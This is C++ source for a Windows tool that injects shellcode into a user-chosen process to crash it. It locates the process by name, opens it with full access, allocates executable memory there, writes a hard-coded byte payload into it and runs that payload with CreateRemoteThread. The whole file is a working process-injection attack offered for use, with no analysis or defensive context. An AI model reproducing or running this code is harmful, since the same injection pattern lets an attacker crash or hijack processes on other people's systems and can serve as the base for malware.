#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

DWORD GetProcessID(const wchar_t* processName)
{
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(hSnapshot, &processEntry))
        {
            do
            {
                if (_wcsicmp(processEntry.szExeFile, processName) == 0)
                {
                    processId = processEntry.th32ProcessID;
                    wprintf(L"Process found: 0x%lX\n", processEntry.th32ProcessID);
                    break;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}
int CrashTargetProcessWithShellCode(const wchar_t* procName)
{
    BOOL wp = 0;
    unsigned char SC[] =
        "\x31\xc0\x89\xc2\xc7\x00\x01\x00\x00\x00";
    HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessID(procName));
    if (!hw)
    {
        printf("Process Not found (0x%lX)\n", GetLastError());
        return 1;
    }
    void* base = VirtualAllocEx(hw, NULL, sizeof(SC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
    {
        CloseHandle(hw);
        return -1;
    }
    if (!WriteProcessMemory(hw, base, SC, sizeof(SC), NULL))
    {
        printf("write process memory faild (0x%lX)\n", GetLastError());
        CloseHandle(hw);
        return -1;
    }
    HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
    if (!thread)
    {
        printf("Failed to create thread (0x%lX)\n", GetLastError());
        CloseHandle(hw);
        CloseHandle(thread);
    }
    printf("Thread Created Succesfully 0x%lX\n", thread);
    if (WaitForSingleObject(thread, INFINITE) != 0b11111111111111111111111111111111)
        printf("Thread finished Succesfully 0x%lX\n", thread);
    else
        printf("error in WaitForSingleObject 0x%lX\n", GetLastError());
    return 0;
}
int main()
{
    std::wcout << L"Enter target process name: ";
    wchar_t targetProcess[256];
    std::wcin >> targetProcess;
    CrashTargetProcessWithShellCode(targetProcess);
}
